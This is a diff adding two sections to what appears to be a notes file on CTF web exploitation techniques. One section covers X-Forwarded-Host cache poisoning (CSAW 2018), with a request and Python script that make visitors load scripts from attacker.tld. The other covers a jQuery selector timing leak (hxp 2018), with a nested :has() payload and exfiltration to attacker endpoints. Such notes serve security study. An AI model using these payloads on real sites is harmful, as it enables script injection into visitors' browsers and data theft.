@@ -10,6 +10,7 @@
 - [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
 - [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
 - [Cache Poisoning](#cache-poisoning)
+  - [X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)](#x-forwarded-host-cdn-template-fetch-poisoning-csaw-2018)
 - [Hidden DOM Elements](#hidden-dom-elements)
 - [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
 - [Magic Link + Redirect Chain XSS](#magic-link--redirect-chain-xss)
@@ -29,6 +30,7 @@
   - [Step 2 — Timing oracle via image loads](#step-2--timing-oracle-via-image-loads)
   - [Step 3 — Character-by-character extraction](#step-3--character-by-character-extraction)
   - [Step 4 — Host exploit and tunnel](#step-4--host-exploit-and-tunnel)
+- [jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)](#jquery-locationhash-css-selector-timing-leak-hxp-2018)
 
 ---
 
@@ -97,6 +99,28 @@ CDN/cache keys only on URL:
 requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
 # All visitors to /search?query=harmless get XSS
 ```
+
+### X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)
+
+**Pattern:** A CDN fronting the app keys cached responses only on path + query. A backend Mustache template renders a `<script src="https://{{host}}/cdn/app.js">` tag where `{{host}}` comes from the `X-Forwarded-Host` header. The attacker sends one request with `X-Forwarded-Host: attacker.tld`, Varnish caches the response for 120 seconds, and every subsequent visitor loads JavaScript from the attacker origin.
+
+```http
+GET /cdn/app.js HTTP/1.1
+Host: target.tld
+X-Forwarded-Host: attacker.tld
+```
+
+```python
+import requests, time
+# Poison the cache
+requests.get("https://target.tld/cdn/app.js",
+             headers={"X-Forwarded-Host": "attacker.tld"})
+# Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
+```
+
+**Key insight:** Cache keys rarely include request headers, even when those headers feed the response body. Any header the backend reflects into HTML (`Host`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`) becomes a web cache poisoning vector the moment the response is cached. Use `Vary: X-Forwarded-Host` or strip these headers at the edge; attackers hunt them with Burp Param Miner (`unkeyed header discovery`).
+
+**References:** CSAW CTF Qualification Round 2018 — Hacker Movie Club, writeup 11277
 
 ---
 
@@ -487,3 +511,19 @@ python3 -m http.server 8888
 **Key insight:** GraphQL GET requests bypass CORS preflight entirely — `new Image().src` triggers a simple GET that doesn't need `OPTIONS`. Combined with timing-based SQLi (`SLEEP()`), image `onerror` timing becomes a boolean oracle. The bot's localhost access turns a localhost-only SQLi into a remotely exploitable vulnerability.
 
 **Detection:** Chat/message features with HTML injection + admin bot + GraphQL endpoint with SQL injection + localhost-only restrictions.
+
+---
+
+## jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)
+
+**Pattern:** Target page calls `$(location.hash).addClass(...)`. Passing a URL fragment that parses as a CSS selector causes jQuery to invoke Sizzle, which walks the DOM matching the selector. Stacking deeply nested `:has()` pseudo-classes blows up selector evaluation time predictably (~2 s) only when the selector *matches*, creating a Boolean timing oracle on any attribute the bot's DOM exposes (for example `body[data-user-id^='1']`).
+
+```text
+http://127.0.0.1/?id=...#*:has(*:has(*:has(*:has(*:has(body[data-user-id^='1'])))))
+```
+
+Exfiltrate by firing two `new Image().src` requests to attacker-controlled endpoints (`/firstping`, `/secondping`) around the `addClass` call and measuring the delta: ~20 ms = mismatch, ~2 s = match.
+
+**Key insight:** jQuery's `$` with a string argument treats anything beginning with `<` as HTML and everything else as a selector. Any sink that lets an attacker put arbitrary text into `$()` becomes both an XSS and a selector-timing oracle.
+
+**References:** hxp CTF 2018 — µblog, writeup 12554
